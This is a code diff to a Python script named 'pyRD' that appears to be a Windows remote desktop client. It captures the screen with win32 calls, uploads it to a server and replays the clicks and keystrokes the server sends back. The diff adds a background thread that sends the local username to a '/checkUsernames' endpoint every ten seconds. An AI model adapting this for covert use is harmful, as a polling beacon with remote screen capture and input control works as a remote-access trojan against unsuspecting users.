@@ -1,31 +1,57 @@
-import pygetwindow as gw
-import pyautogui
-import time
-import requests
+import win32gui
+import win32ui
+import win32con
+import win32api
 import win32com.client
-import argparse
+from PIL import Image
 import io
+import requests
+import time
+import argparse
+import subprocess
+import win32api
+import win32con
 
-def capture_screen():
-    screen = pyautogui.screenshot()
-    return screen
-
-def get_screen_size():
-    return pyautogui.size()
+def get_desktop_dimensions():
+    monitor_info = win32api.EnumDisplayMonitors(None, None)
+    primary_monitor = monitor_info[0][0]  # Assuming the first monitor is the primary one
+    monitor_info_ex = win32api.GetMonitorInfo(primary_monitor)
+    rect = monitor_info_ex['Monitor']
+    width = rect[2] - rect[0]
+    height = rect[3] - rect[1]
+    # print(width, height)
+    return width, height
 
 def main(host, key):
     r = requests.post(host+'/new_session', json={'_key': key})
-    if r.status_code != 200:    
+    if r.status_code != 200:
         print('Server not available.')
         return
 
     shell = win32com.client.Dispatch('WScript.Shell')
     PREV_IMG = None
     while True:
-        desktop = capture_screen()
-        width, height = get_screen_size()
+        width, height = get_desktop_dimensions()
 
-        pillow_img = desktop
+        # device context
+        desktop_dc = win32gui.GetWindowDC(win32gui.GetDesktopWindow())
+        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+
+        # memory context
+        mem_dc = img_dc.CreateCompatibleDC()
+
+        screenshot = win32ui.CreateBitmap()
+        screenshot.CreateCompatibleBitmap(img_dc, width, height)
+        mem_dc.SelectObject(screenshot)
+
+        bmpinfo = screenshot.GetInfo()
+
+        # copy into memory
+        mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
+
+        bmpstr = screenshot.GetBitmapBits(True)
+
+        pillow_img = Image.frombytes('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX')
 
         with io.BytesIO() as image_data:
             pillow_img.save(image_data, 'PNG')
@@ -43,7 +69,7 @@ def main(host, key):
 
             PREV_IMG = image_data_content
         else:
-            #print('no desktop change')
+            # print('no desktop change')
             pass
 
         # events
@@ -54,8 +80,11 @@ def main(host, key):
                 print(e)
 
                 if e['type'] == 'click':
-                    pyautogui.moveTo(e['x'], e['y'], duration=0.2)  # Move to the position first
-                    pyautogui.click()  # Then click
+                    win32api.SetCursorPos((e['x'], e['y']))
+                    time.sleep(0.1)
+                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, e['x'], e['y'], 0, 0)
+                    time.sleep(0.02)
+                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, e['x'], e['y'], 0, 0)
 
                 if e['type'] == 'keydown':
                     cmd = ''
@@ -81,12 +110,49 @@ def main(host, key):
             print(err)
             pass
 
+        # free
+        mem_dc.DeleteDC()
+        win32gui.DeleteObject(screenshot.GetHandle())
         time.sleep(0.2)
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='pyRD')
-    parser.add_argument('addr', help='server address', type=str)
-    parser.add_argument('key', help='access key', type=str)
-    args = parser.parse_args()
+print('hello')
+parser = argparse.ArgumentParser(description='pyRD')
+import getpass
+username = getpass.getuser()
+print("Username:", username)
+parser.add_argument('addr', help='server address', type=str)
+# parser.add_argument('key', help='access key', type=str)
 
-    main(args.addr, args.key)
+
+import requests
+import threading
+import time
+
+base_url = '<http://server_ip>:<server_port>'
+
+def send_request():
+    while True:
+        try:
+            # Define the data to be sent
+            data = {
+                'key1': username,
+            }
+
+            # Send the GET request with data
+            response = requests.get(base_url + '/checkUsernames', params=data)
+            print(response.text)
+        except Exception as e:
+            print("Error:", e)
+        
+        # Wait for 10 seconds before sending the next request
+        time.sleep(10)
+
+# Start the thread
+thread = threading.Thread(target=send_request)
+thread.daemon = True  # Set the thread as daemon so it exits when the main program exits
+thread.start()
+
+# Main program continues...
+# You can put your main program logic here
+# It will run concurrently with the thread making GET requestsf
+main(base_url, username)
